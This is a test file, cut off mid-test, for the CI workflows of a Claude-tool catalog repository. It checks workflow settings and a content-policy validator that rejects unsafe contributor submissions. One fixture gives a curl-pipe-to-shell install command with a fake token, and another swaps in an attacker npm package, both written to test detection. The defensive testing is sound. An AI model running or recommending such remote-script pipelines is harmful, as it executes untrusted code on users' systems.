import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";

import {
  buildReadmeRefreshBody,
  extractReadmeEntryChanges,
  main as buildReadmeRefreshBodyMain,
  resolveReadmeEntryChange,
  summarizeReadmeEntryChange,
} from "../scripts/build-readme-refresh-body.mjs";
import { buildZip } from "./helpers/zip-fixtures";
import { repoRoot } from "./helpers/registry-fixtures";

describe("submission automation workflows", () => {
  function writeFile(filePath: string, content: string) {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content, "utf8");
  }

  function git(cwd: string, args: string[]) {
    return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
  }

  function runClassifierForChangedFiles(files: Record<string, string>) {
    const tmpDir = fs.mkdtempSync(
      path.join(os.tmpdir(), "heyclaude-classifier-"),
    );
    git(tmpDir, ["init", "-b", "main"]);
    git(tmpDir, ["config", "user.name", "HeyClaude Test"]);
    git(tmpDir, ["config", "user.email", "test@example.com"]);
    git(tmpDir, ["config", "commit.gpgsign", "false"]);
    git(tmpDir, ["config", "tag.gpgsign", "false"]);
    writeFile(path.join(tmpDir, "README.md"), "# Test\n");
    git(tmpDir, ["add", "README.md"]);
    git(tmpDir, ["commit", "-m", "test: initial content"]);
    const baseSha = git(tmpDir, ["rev-parse", "HEAD"]);

    for (const [filePath, content] of Object.entries(files)) {
      writeFile(path.join(tmpDir, filePath), content);
    }
    git(tmpDir, ["add", "."]);
    git(tmpDir, ["commit", "-m", "test: update content"]);

    const outputPath = path.join(tmpDir, "github-output.txt");
    execFileSync(
      process.execPath,
      [path.join(repoRoot, "scripts/ci/classify-pr-changes.mjs")],
      {
        cwd: tmpDir,
        encoding: "utf8",
        env: {
          ...process.env,
          BASE_SHA: baseSha,
          BASE_REF: "",
          FORCE_FULL_VALIDATION: "0",
          GITHUB_BASE_REF: "",
          GITHUB_EVENT_NAME: "pull_request",
          HEAD_SHA: "",
          GITHUB_OUTPUT: outputPath,
          GITHUB_HEAD_REF: "contributor/source-entry",
          HEAD_REF: "contributor/source-entry",
        },
      },
    );

    return Object.fromEntries(
      fs
        .readFileSync(outputPath, "utf8")
        .split(/\r?\n/)
        .filter(Boolean)
        .map((line) => {
          const separator = line.indexOf("=");
          return [line.slice(0, separator), line.slice(separator + 1)];
        }),
    );
  }

  function runContentPolicyForChangedFiles(
    files: Record<
      string,
      string | { content: string; status?: string; baseContent?: string }
    >,
    options: {
      headRepo?: string;
      baseRepo?: string;
      headRef?: string;
      prAuthor?: string;
    } = {},
  ) {
    const tmpDir = fs.mkdtempSync(
      path.join(os.tmpdir(), "heyclaude-content-policy-"),
    );
    const changedFiles = [];

    for (const [filePath, spec] of Object.entries(files)) {
      const content = typeof spec === "string" ? spec : spec.content;
      const status = typeof spec === "string" ? "modified" : spec.status;
      const baseContent =
        typeof spec === "string" ? undefined : spec.baseContent;
      writeFile(path.join(tmpDir, filePath), content);
      changedFiles.push({
        filename: filePath,
        status: status || "modified",
        ...(baseContent === undefined ? {} : { baseContent }),
      });
    }

    const filesPath = path.join(tmpDir, "changed-files.json");
    const outputPath = path.join(tmpDir, "content-policy.json");
    fs.writeFileSync(filesPath, JSON.stringify(changedFiles), "utf8");

    try {
      execFileSync(
        process.execPath,
        [
          path.join(repoRoot, "scripts/ci/validate-content-policy.mjs"),
          "--repo-root",
          tmpDir,
          "--files-json",
          filesPath,
          "--head-repo",
          options.headRepo || "contributor/awesome-claude",
          "--base-repo",
          options.baseRepo || "JSONbored/awesome-claude",
          "--head-ref",
          options.headRef || "contributor/source-entry",
          "--pr-author",
          options.prAuthor || "contributor",
          "--output",
          outputPath,
        ],
        { cwd: repoRoot, encoding: "utf8", stdio: "pipe" },
      );
      return {
        ok: true,
        report: JSON.parse(fs.readFileSync(outputPath, "utf8")),
      };
    } catch (error) {
      const execError = error as { stdout?: unknown; stderr?: unknown };
      return {
        ok: false,
        stdout: String(execError.stdout || ""),
        stderr: String(execError.stderr || ""),
        report: fs.existsSync(outputPath)
          ? JSON.parse(fs.readFileSync(outputPath, "utf8"))
          : null,
      };
    }
  }

  function contentFixture(frontmatter: string, body = "Useful content.") {
    return `---\n${frontmatter.trim()}\n---\n\n${body}\n`;
  }

  it("keeps direct PR quality evidence requirements visible", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/pull_request_template.md"),
      "utf8",
    );

    expect(source).toContain("## Quality Evidence");
    expect(source).toContain("Desktop:");
    expect(source).toContain("Mobile:");
    expect(source).toContain("No visual impact");
    expect(source).toContain("Important edge cases or invariants");
    expect(source).toContain("Backward compatibility notes");
    expect(source).toContain("Accessibility notes for UI changes");
    expect(source).toMatch(/[Ll]inked issue/);
    expect(source).toContain("no-issue rationale");
    expect(source).toContain("For registry API endpoint PRs");
    expect(source).toContain("Origin-check and rate-limit posture");
    expect(source).toContain("Generator reproducibility");
  });

  it("keeps product feature issues scoped with screenshot expectations", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/ISSUE_TEMPLATE/product-feature.yml"),
      "utf8",
    );

    expect(source).toContain("Product or feature improvement");
    expect(source).not.toContain("gittensor:feature");
    expect(source).toContain("id: quality_evidence");
    expect(source).toContain("desktop and mobile screenshots");
    expect(source).toContain("No visual impact");
    expect(source).toContain("Generated artifacts stay out of scope");
    expect(source).toContain("Closes #<issue>");
  });

  it("keeps the devcontainer minimal and manual-install oriented", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".devcontainer/devcontainer.json"),
      "utf8",
    );
    const config = JSON.parse(source);

    expect(config.image).toContain("javascript-node");
    expect(config.image).toContain("24");
    expect(config.postCreateCommand).toContain("corepack enable");
    expect(config.postCreateCommand).toContain("pnpm@11.1.3");
    expect(config.postCreateCommand).not.toContain("pnpm install");
    expect(config.postCreateCommand).not.toContain("playwright install");
  });

  it("keeps required PR validation Vitest-based without normal Playwright runs", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/content-validation.yml"),
      "utf8",
    );

    expect(source).toContain("validate-worktree:");
    expect(source).toContain('git diff --check "$BASE_SHA"...HEAD');
    // The full Vitest suite is NOT duplicated in the validate lanes — it runs once in coverage.yml
    // (pnpm test:coverage); validate-web keeps only the web-specific gates below. (#dedupe-suite)
    expect(source).not.toContain("Run Vitest suite");
    const coverageWorkflow = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/coverage.yml"),
      "utf8",
    );
    expect(coverageWorkflow).toContain("pnpm test:coverage");
    expect(source).toContain("pnpm type-check");
    expect(source).toContain("pnpm build");
    expect(source).not.toContain("pnpm test:e2e");
    expect(source).not.toContain("playwright install");
    expect(source).toContain("Resolve PR preview URL");
    expect(source).toContain("--wait-seconds 240");
    expect(source).toContain(
      "github.event.pull_request.head.repo.full_name == github.repository",
    );
    const previewBlock =
      source.match(
        /\n  validate-pr-preview:[\s\S]*?\n  required-pr-gate:/,
      )?.[0] || "";
    expect(previewBlock).toContain(
      "group: deployment-artifacts-pr-preview-${{ github.ref }}\n",
    );
    expect(previewBlock).not.toContain("github.event.pull_request.number");
    expect(source).not.toContain("CLOUDFLARE_API_TOKEN");
    expect(source).not.toContain("CLOUDFLARE_ACCOUNT_ID");
    expect(source).not.toContain("pnpm --filter web run deploy:dev");
    expect(source).not.toContain("PREVIEW_DEPLOYMENT_URL:");
  });

  it("skips Pipelock advisory scans for pure content and README-only PRs", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/pipelock-security.yml"),
      "utf8",
    );

    expect(source).toContain("paths-ignore:");
    expect(source).toContain('- "content/**"');
    expect(source).toContain('- "README.md"');
    expect(source).toContain("workflow_dispatch:");
  });

  it("removes public issue intake workflows from GitHub Actions", () => {
    for (const workflow of [
      "submission-issue-validation.yml",
      "submission-import-pr.yml",
      "submission-stale.yml",
      "submission-queue.yml",
    ]) {
      expect(
        fs.existsSync(path.join(repoRoot, ".github/workflows", workflow)),
        workflow,
      ).toBe(false);
    }
  });

  it("removes the legacy issue auto-import eligibility script", () => {
    expect(
      fs.existsSync(
        path.join(repoRoot, "scripts/ci/check-auto-import-eligibility.mjs"),
      ),
    ).toBe(false);
  });

  it("removes the noisy direct PR risk workflow", () => {
    expect(
      fs.existsSync(
        path.join(repoRoot, ".github/workflows/submission-pr-risk.yml"),
      ),
    ).toBe(false);
  });

  it("keeps advisory Superagent scanning pull-request scoped, read-only, and secret-gated", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/superagent-security.yml"),
      "utf8",
    );

    expect(source).toContain("pull_request:");
    expect(source).toContain("workflow_dispatch:");
    expect(source).not.toContain("pull_request_target");
    expect(source).toContain("contents: read");
    expect(source).toContain("superagent-repo-scan:");
    expect(source).toContain("name: superagent-repo-scan");
    expect(source).toContain("SUPERAGENT_API_KEY");
    expect(source).toContain("DAYTONA_API_KEY");
    expect(source).toContain("Checkout trusted scanner tools");
    expect(source).toContain(
      "ref: ${{ github.event.pull_request.base.sha || github.sha }}",
    );
    expect(source).toContain("path: scanner-tools");
    expect(source).toContain("pnpm install --frozen-lockfile --ignore-scripts");
    expect(source).toContain("working-directory: scanner-tools");
    expect(source).toContain("pnpm exec superagent scan");
    expect(source).toContain('--repo "$SCAN_REPO"');
    expect(source).toContain('--branch "$SCAN_BRANCH"');
    expect(source).toContain(
      "Fork pull requests rely on the installed Marketplace app checks.",
    );
  });

  it("keeps Pipelock advisory and pinned", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/pipelock-security.yml"),
      "utf8",
    );

    expect(source).toContain("pull_request:");
    expect(source).toContain("workflow_dispatch:");
    expect(source).not.toContain("pull_request_target");
    expect(source).toContain("contents: read");
    expect(source).toContain(
      "luckyPipewrench/pipelock@dcd25d8ea407f087fa9f2d4a0f8bddea5c997f07",
    );
    expect(source).toContain('fail-on-findings: "false"');
    expect(source).toContain("continue-on-error: true");
  });

  it("limits Socket app reports to dependency files", () => {
    const source = fs.readFileSync(path.join(repoRoot, "socket.yml"), "utf8");

    expect(source).toContain("version: 2");
    expect(source).toContain("triggerPaths:");
    expect(source).toContain("package.json");
    expect(source).toContain("pnpm-lock.yaml");
    expect(source).toContain("apps/web/package.json");
    expect(source).toContain("packages/mcp/package.json");
    expect(source).toContain("packages/registry/package.json");
    expect(source).toContain("integrations/raycast/package.json");
    expect(source).toContain("githubApp:");
    expect(source).toContain("enabled: true");
  });

  it("keeps import PR generation out of public issue workflows and gate bindings", () => {
    expect(
      fs.existsSync(
        path.join(repoRoot, ".github/workflows/submission-import-pr.yml"),
      ),
    ).toBe(false);
    const gateConfig = fs.readFileSync(
      path.join(repoRoot, "apps/submission-gate/wrangler.jsonc"),
      "utf8",
    );
    expect(gateConfig).not.toContain('"SUBMISSION_IMPORT_QUEUE"');
    expect(gateConfig).not.toContain('"SUBMISSION_IMPORT_RUNNER"');
    expect(gateConfig).not.toContain('"containers"');
  });

  it("requires preview artifact validation before pull requests can merge", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/content-validation.yml"),
      "utf8",
    );

    expect(source).toContain("classify-pr:");
    expect(source).toContain("required-pr-gate:");
    expect(source).toContain("validate-content-${{ matrix.category }}");
    expect(source).toContain(
      "always() && needs.classify-pr.outputs.content == 'true'",
    );
    expect(source).toContain(
      "fromJson(needs.classify-pr.outputs.content_categories_json)",
    );
    expect(source).toContain(
      "changed_files_json: ${{ steps.classify.outputs.changed_files_json }}",
    );
    expect(source).toContain("Summarize required PR validation");
    expect(source).toContain('trunk check --ci --upstream "$BASE_SHA"');
    expect(source).toContain("trunk check --ci --all");
    expect(source).toContain("validate-pr-preview:");
    expect(source).toContain("github.event_name == 'pull_request'");
    expect(source).toContain("github.event_name == 'workflow_dispatch'");
    expect(source).toContain("github.ref_name == 'automation/readme-refresh'");
    expect(source).toContain(
      "github.event.pull_request.head.repo.full_name == github.repository",
    );
    const previewBlock =
      source.match(
        /\n  validate-pr-preview:[\s\S]*?\n  required-pr-gate:/,
      )?.[0] || "";
    expect(previewBlock).toContain(
      "group: deployment-artifacts-pr-preview-${{ github.ref }}\n",
    );
    expect(previewBlock).not.toContain("github.event.pull_request.number");
    expect(source).toContain("Resolve PR preview URL");
    expect(source).toContain("--wait-seconds 240");
    // Preview resolution degrades gracefully: with the shared dev Worker retired,
    // it validates a real prod preview-version URL when resolvable and skips
    // cleanly otherwise (downstream steps are gated on a non-empty base-url).
    expect(source).toContain("--allow-missing");
    expect(source).toContain("pnpm validate:deployment-artifacts");
    expect(source).toContain("pnpm validate:mcp-endpoint");
    expect(source).not.toContain("Deploy same-repo PR preview to dev Worker");
    expect(source).not.toContain("CLOUDFLARE_API_TOKEN");
    expect(source).not.toContain("vars.DEPLOYMENT_ARTIFACT_BASE_URL");
  });

  it("feeds deterministic content policy into required PR validation", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/content-validation.yml"),
      "utf8",
    );

    expect(source).toContain("validate-content-policy:");
    expect(source).toContain("Validate direct content policy");
    expect(source).toContain("scripts/ci/validate-content-policy.mjs");
    expect(source).toContain("needs.classify-pr.outputs.content == 'true'");
    expect(source).toContain("needs.classify-pr.outputs.registry == 'true'");
    expect(source).toContain("needs.classify-pr.outputs.packages == 'true'");
    expect(source).toContain("validate-content-policy");
    expect(source).toContain("trusted_policy");
    expect(source).toContain("trusted_policy_dir");
    expect(source).toContain("runtime_lock_path");
    expect(source).toContain("CHANGED_FILES_JSON:");
    expect(source).toContain('--files-json "$changed_files_json_path"');
    expect(source).toContain(
      "scripts/ci/content-policy-runtime/package-lock.json",
    );
    expect(source).toContain("npm ci --ignore-scripts");
    expect(source).toContain("--ignore-scripts");
    expect(source).toContain("--no-audit --no-fund");
    expect(source).toContain("persist-credentials: false");
    expect(source).not.toContain('ln -s "$GITHUB_WORKSPACE/node_modules"');
    expect(source).toContain(
      "HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}",
    );
    expect(source).toContain("Build registry artifacts");
    expect(source).toContain("pnpm --filter web run prebuild");
    expect(source).toContain("pnpm validate:readme");
    expect(source).toContain(
      "Verify generated registry artifacts remain build outputs",
    );
    expect(source).toContain("Registry generation changed non-generated files");
    expect(source).not.toContain(
      "git diff --exit-code apps/web/public/data apps/web/src/generated README.md",
    );
  });

  it("does not persist GitHub credentials in the prebuild checkout", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/content-validation.yml"),
      "utf8",
    );
    const prebuildBlock =
      source.match(/\n  prebuild:[\s\S]*?\n  validate-ci:/)?.[0] || "";

    expect(prebuildBlock).toContain("name: prebuild");
    expect(prebuildBlock).toContain(
      "uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
    );
    expect(prebuildBlock).toContain("fetch-depth: 0");
    expect(prebuildBlock).toContain("persist-credentials: false");
  });

  it("keeps source-only import diffs focused on content and build artifacts", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/content-validation.yml"),
      "utf8",
    );

    expect(source).toContain(
      "Verify source-only imports produce only build artifacts",
    );
    expect(source).toContain("git checkout -- pnpm-lock.yaml");
    expect(source).toContain(
      "grep -Ev '^(README\\.md|apps/web/public/data/.*|apps/web/src/generated/.*|apps/web/src/routeTree\\.gen\\.ts)$'",
    );
    expect(source).toContain(
      "Content import generation changed non-generated files",
    );
  });

  it("routes hook-only content PRs through direct submission and registry validation", () => {
    const lanes = runClassifierForChangedFiles({
      "content/hooks/retro-daily.mdx": contentFixture(`
title: Retro Daily
slug: retro-daily
category: hooks
description: Daily Claude Code retro dashboard hook.
`),
    });

    expect(lanes.content).toBe("true");
    expect(lanes.content_categories_json).toBe('["hooks"]');
    expect(lanes.direct_submission).toBe("true");
    expect(lanes.registry).toBe("true");
    expect(lanes.web).toBe("false");
    expect(lanes.mcp).toBe("false");
    expect(lanes.raycast).toBe("false");
    expect(lanes.packages).toBe("false");
  });

  it("blocks external generated artifact edits through content policy", () => {
    const result = runContentPolicyForChangedFiles({
      "README.md": "# Changed by contributor\n",
    });

    expect(result.ok).toBe(false);
    expect(result.report?.failures.join("\n")).toContain(
      "Direct contributor PRs should not edit README.md",
    );
  });

  it("treats fork PR automation-looking refs as external direct content", () => {
    const result = runContentPolicyForChangedFiles(
      {
        "content/mcp/spoofed-automation-import.mdx": {
          status: "added",
          content: contentFixture(
            `
title: Spoofed Automation Import MCP
slug: spoofed-automation-import
category: mcp
description: Example MCP server with unsafe installation instructions.
repoUrl: https://github.com/example/spoofed-automation-import
installCommand: "curl http://example.com/install.sh | sh # ghp_1234567890abcdef1234567890abcdef1234"
`,
            "Install by piping the remote script into a shell.",
          ),
        },
        "README.md": "# Contributor-generated README change\n",
      },
      { headRef: "automation/submission-123-spoofed" },
    );

    expect(result.ok).toBe(false);
    expect(result.report?.sourceType).toBe("external_direct");
    expect(result.report?.failures.join("\n")).toContain(
      "Install instructions include a destructive or remote-code execution pipeline",
    );
    expect(result.report?.failures.join("\n")).toContain(
      "Direct contributor PRs should not edit README.md",
    );
  });

  it("blocks new direct content PR entries without submitter provenance", () => {
    const result = runContentPolicyForChangedFiles({
      "content/mcp/no-provenance.mdx": {
        status: "added",
        content: contentFixture(
          `
title: No Provenance MCP
slug: no-provenance
category: mcp
description: Example MCP server without submitter provenance.
installCommand: "npx -y no-provenance"
usageSnippet: "claude mcp add no-provenance -- npx -y no-provenance"
`,
          "Source-backed MCP server content.",
        ),
      },
    });

    expect(result.ok).toBe(false);
    expect(result.report?.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "missing_direct_pr_submitter_content/mcp/no-provenance.mdx",
        }),
      ]),
    );
  });

  it("allows external metadata updates to existing content without submitter provenance", () => {
    const baseContent = contentFixture(
      `
title: Existing Hook
slug: existing-hook
category: hooks
description: Existing SessionStart hook entry.
`,
      "This SessionStart hook reads local workspace logs and summarizes user activity.",
    );
    const result = runContentPolicyForChangedFiles({
      "content/hooks/existing-hook.mdx": {
        status: "modified",
        baseContent,
        content: contentFixture(
          `
title: Existing Hook
slug: existing-hook
category: hooks
description: Existing SessionStart hook entry.
safetyNotes:
  - Runs as a Claude Code SessionStart hook and can execute local shell scripts.
privacyNotes:
  - Reads local Claude Code activity and workspace-derived logs for summaries.
`,
          "This SessionStart hook reads local workspace logs and summarizes user activity.",
        ),
      },
    });

    expect(result.ok).toBe(true);
    expect(result.report?.provenanceFindings).toEqual([]);
  });

  it("blocks external metadata updates that change existing submitter provenance", () => {
    const baseContent = contentFixture(
      `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: original-submitter
submittedByUrl: https://github.com/original-submitter
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
      "Source-backed MCP server content.",
    );
    const result = runContentPolicyForChangedFiles({
      "content/mcp/existing-mcp.mdx": {
        status: "modified",
        baseContent,
        content: contentFixture(
          `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: someone-else
submittedByUrl: https://github.com/someone-else
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
          "Source-backed MCP server content.",
        ),
      },
    });

    expect(result.ok).toBe(false);
    expect(result.report?.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "direct_pr_existing_provenance_change_content/mcp/existing-mcp.mdx",
        }),
      ]),
    );
  });

  it("blocks external metadata updates that add provenance to existing content", () => {
    const baseContent = contentFixture(
      `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
      "Source-backed MCP server content.",
    );
    const result = runContentPolicyForChangedFiles({
      "content/mcp/existing-mcp.mdx": {
        status: "modified",
        baseContent,
        content: contentFixture(
          `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
          "Source-backed MCP server content.",
        ),
      },
    });

    expect(result.ok).toBe(false);
    expect(result.report?.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "direct_pr_existing_provenance_change_content/mcp/existing-mcp.mdx",
        }),
      ]),
    );
  });

  it("blocks external executable content updates on existing entries with stale provenance", () => {
    const baseContent = contentFixture(
      `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: original-submitter
submittedByUrl: https://github.com/original-submitter
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
      "Source-backed MCP server content.",
    );
    const result = runContentPolicyForChangedFiles({
      "content/mcp/existing-mcp.mdx": {
        status: "modified",
        baseContent,
        content: contentFixture(
          `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: original-submitter
submittedByUrl: https://github.com/original-submitter
installCommand: "npx -y attacker-mcp"
usageSnippet: "claude mcp add attacker-mcp -- npx -y attacker-mcp"
`,
          "Source-backed MCP server content.",
        ),
      },
    });

    expect(result.ok).toBe(false);
    expect(result.report?.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "direct_pr_submitter_mismatch_content/mcp/existing-mcp.mdx",
        }),
      ]),
    );
  });

  it("blocks external trust metadata updates on existing entries with stale provenance", () => {
    const baseContent = contentFixture(
      `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: original-submitter
submittedByUrl: https://github.com/original-submitter
submissionIssueUrl: https://github.com/JSONbored/awesome-claude/issues/1
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
      "Source-backed MCP server content.",
    );
    const result = runContentPolicyForChangedFiles({
      "content/mcp/existing-mcp.mdx": {
        status: "modified",
        baseContent,
        content: contentFixture(
          `
title: Existing MCP
slug: existing-mcp
category: mcp
description: Existing MCP server entry.
submittedBy: original-submitter
submittedByUrl: https://github.com/original-submitter
submissionIssueUrl: https://github.com/JSONbored/awesome-claude/issues/999
installCommand: "npx -y existing-mcp"
usageSnippet: "claude mcp add existing-mcp -- npx -y existing-mcp"
`,
          "Source-backed MCP server content.",
        ),
      },
    });

    expect(result.ok).toBe(false);
    expect(result.report?.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "direct_pr_submitter_mismatch_content/mcp/existing-mcp.mdx",
        }),
      ]),
    );
  });

  it("blocks community local download requests through content policy", () => {
    const result = runContentPolicyForChangedFiles({
      "content/skills/example-skill.mdx": contentFixture(
        `
title: Example Skill
slug: example-skill
category: skills
description: Example source-backed skill.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
downloadUrl: /downloads/example-skill.zip
`,
        "Use this skill after reviewing the source.",
      ),
    });

    expect(result.ok).toBe(false);
    expect(result.report?.failures.join("\n")).toContain(
      "Community PRs cannot request HeyClaude-hosted /downloads package URLs.",
    );
  });

  it("blocks hook content that requests HeyClaude-hosted download archives", () => {
    const result = runContentPolicyForChangedFiles({
      "content/hooks/downloaded-hook.mdx": contentFixture(
        `
title: Downloaded Hook
slug: downloaded-hook
category: hooks
description: Hook package submitted as a hosted archive.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
downloadUrl: /downloads/downloaded-hook.zip
scriptLanguage: bash
scriptBody: |-
  #!/bin/bash
  echo "Downloaded hook"
`,
        "Use this hook only after reviewing the source archive.",
      ),
    });

    expect(result.ok).toBe(false);
    expect(result.report?.reviewFlags).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "community_local_download_request" }),
      ]),
    );
    expect(result.report?.failures.join("\n")).toContain(
      "Community PRs cannot request HeyClaude-hosted /downloads package URLs.",
    );
  });

  it("blocks external packageVerified true through content policy", () => {
    const result = runContentPolicyForChangedFiles({
      "content/skills/example-skill.mdx": contentFixture(
        `
title: Example Skill
slug: example-skill
category: skills
description: Example source-backed skill.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
packageVerified: true
`,
        "Use this skill after reviewing the source.",
      ),
    });

    expect(result.ok).toBe(false);
    expect(result.report?.failures.join("\n")).toContain(
      "External contributor PRs cannot mark packages as packageVerified: true.",
    );
  });

  it("blocks sensitive content without safety or privacy notes", () => {
    const result = runContentPolicyForChangedFiles({
      "content/hooks/session-start-retro.mdx": contentFixture(
        `
title: Session Start Retro
slug: session-start-retro
category: hooks
description: SessionStart hook for reviewing local Claude Code activity.
submittedBy: contributor
submittedByUrl: https://github.com/contributor
`,
        "This SessionStart background hook reads local workspace logs and summarizes user activity.",
      ),
    });

    expect(result.ok).toBe(false);
    expect(result.report?.failures.join("\n")).toContain(
      "needs safetyNotes disclosure",
    );
    expect(result.report?.failures.join("\n")).toContain(
      "needs privacyNotes disclosure",
    );
  });

  it("allows sensitive hook content when safety and privacy notes are present", () => {
    const result = runContentPolicyForChangedFiles({
      "content/hooks/session-start-retro.mdx": contentFixture(
        `
title: Session Start Retro
slug: session-start-retro
category: hooks
description: SessionStart hook for reviewing local Claude Code activity.
repoUrl: https://github.com/contributor/session-start-retro
submittedBy: contributor
submittedByUrl: https://github.com/contributor
safetyNotes:
  - Runs as a local SessionStart background hook and writes only user-local summary files.
privacyNotes:
  - Reads local Claude Code project logs and keeps summaries on the user's machine.
scriptLanguage: bash
scriptBody: |-
  #!/bin/bash
  echo "Session start summary"
`,
        "This SessionStart background hook reads local workspace logs and summarizes user activity.",
      ),
    });

    expect(result.ok).toBe(true);
    expect(result.report?.failures).toEqual([]);
    expect(result.report?.reviewFlags).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "background_worker_or_daemon" }),
        expect.objectContaining({ id: "local_or_personal_data_access" }),
      ]),
    );
    expect(result.report?.classificationWarnings).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "missing_safety_notes" }),
      ]),
    );
    expect(result.report?.classificationWarnings).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "missing_privacy_notes" }),
      ]),
    );
  });

  it("uses generated README refresh body metadata instead of a static PR body", () => {
    const source = fs.readFileSync(
      path.join(repoRoot, ".github/workflows/readme-refresh-pr.yml"),
      "utf8",
    );

    expect(source).toContain("fetch-depth: 0");
    expect(source).toContain("scripts/build-readme-refresh-body.mjs");
    expect(source).toContain("Build README refresh body");
    expect(source).toContain("Publish README refresh branch");
    expect(source).toContain("refresh-readme-automation-readme-refresh");
    expect(source).toContain("git diff --quiet origin/main -- README.md");
    expect(source).toContain(
      "git restore --worktree --staged -- . ':!README.md'",
    );
    expect(source).toContain("unexpected_files");
    expect(source).toContain(
      'git ls-remote --heads origin "refs/heads/$BRANCH_NAME"',
    );
    expect(source).not.toContain('git ls-remote --heads origin "$BRANCH_NAME"');
    expect(source).toContain(
      '--force-with-lease="refs/heads/$BRANCH_NAME:$remote_branch_sha"',
    );
    expect(source).toContain('--force-with-lease="refs/heads/$BRANCH_NAME:"');
    expect(source).toContain("git push --force-with-lease");
    expect(source).toContain("Create or update README refresh PR");
    expect(source).toContain(
      '--body-file "$RUNNER_TEMP/readme-refresh-body.md"',
    );
    expect(source).toContain("actions: write");
    expect(source).toContain("Trigger content validation for README PR");
    expect(source).toContain(
      'gh workflow run content-validation.yml --ref "$VALIDATION_REF"',
    );
    expect(source).toContain(".github/workflows/readme-refresh-pr.yml");
    expect(source).not.toContain("peter-evans/create-pull-request");
    expect(source).not.toContain("body: |");
  });

  it("extracts every pending README catalog entry from the diff", () => {
    const changes = extractReadmeEntryChanges(`
diff --git a/README.md b/README.md
@@ -1,2 +1,3 @@
+- **[Xquik MCP Server](https://heyclau.de/entry/mcp/xquik-mcp-server)** - Remote X and Twitter MCP server.
+- **[Memesio MCP Server](https://heyclau.de/entry/mcp/memesio-mcp-server)** - Hosted meme generation MCP server.
-- **[Existing Tool](https://heyclau.de/tools/existing-tool)** - Old copy.
+- **[Existing Tool](https://heyclau.de/tools/existing-tool)** - New copy.
`);

    expect(changes).toMatchObject([
      {
        changeType: "added",
        category: "mcp",
        slug: "memesio-mcp-server",
      },
      {
        changeType: "added",
        category: "mcp",
        slug: "xquik-mcp-server",
      },
      {
        changeType: "updated",
        category: "tools",
        slug: "existing-tool",
      },
    ]);
  });

  it("extracts PR 1727-style accumulated README entries", () => {
    const changes = extractReadmeEntryChanges(`
diff --git a/README.md b/README.md
@@ -1,2 +1,4 @@
+- **[Agent SDK Production Architect Agent](https://heyclau.de/entry/agents/agent-sdk-production-architect-agent)** - Designs production Claude Agent SDK deployments.
+- **[Slash Commands in Claude Agent SDK Sessions](https://heyclau.de/entry/guides/slash-commands-claude-agent-sdk-sessions)** - Use slash commands in long-running agent sessions.
`);

    expect(changes).toMatchObject([
      {
        changeType: "added",
        category: "agents",
        slug: "agent-sdk-production-architect-agent",
      },
      {
        changeType: "added",
        category: "guides",
        slug: "slash-commands-claude-agent-sdk-sessions",
      },
    ]);
  });

  it("summarizes direct PR and source-submission README provenance", () => {
    expect(
      summarizeReadmeEntryChange({
        change: {
          changeType: "added",
          category: "mcp",
          slug: "xquik-mcp-server",
          title: "Xquik MCP Server",
        },
        associatedPullRequest: {
          number: 326,
          html_url: "https://github.com/JSONbored/awesome-claude/pull/326",
          user: { login: "kriptoburak" },
        },
        repository: "JSONbored/awesome-claude",
      }),
    ).toBe(
      "Added [Xquik MCP Server](https://heyclau.de/entry/mcp/xquik-mcp-server) content submission ([#326](https://github.com/JSONbored/awesome-claude/pull/326)) by [@kriptoburak](https://github.com/kriptoburak)",
    );

    expect(
      summarizeReadmeEntryChange({
